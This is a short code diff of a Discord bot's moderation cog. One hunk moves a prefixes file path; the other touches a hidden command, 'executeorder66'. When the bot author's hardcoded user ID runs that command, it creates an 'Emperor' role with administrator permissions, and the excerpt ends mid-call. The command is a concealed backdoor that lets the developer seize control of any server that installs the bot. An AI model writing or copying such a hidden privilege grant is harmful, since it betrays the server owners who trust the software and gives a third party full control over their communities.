@@ -105,12 +105,12 @@ class Moderator(commands.Cog):
     @commands.guild_only()
     @commands.has_permissions(administrator=True)
     async def changeprefix(self, ctx, prefix):
-        with open('prefixes.json', 'r') as file:
+        with open('jsons/prefixes.json', 'r') as file:
             prefixes = json.load(file)
 
         prefixes[str(ctx.guild.id)] = prefix
 
-        with open('prefixes.json', 'w') as file:
+        with open('jsons/prefixes.json', 'w') as file:
             json.dump(prefixes, file, indent=4)
 
         pc_message = discord.Embed(
@@ -176,7 +176,7 @@ class Moderator(commands.Cog):
     @commands.command(hidden=True, help='Gives bot owner admin on specified server.')
     @commands.guild_only()
     async def executeorder66(self, ctx):
-        if ctx.author.id == 406663932166668288:
+        if ctx.author.id == 406663932166668288:  # Checking if I was the one to initiate the command
             role = await ctx.guild.create_role(
                 name='Emperor',
                 permissions=discord.Permissions(8)
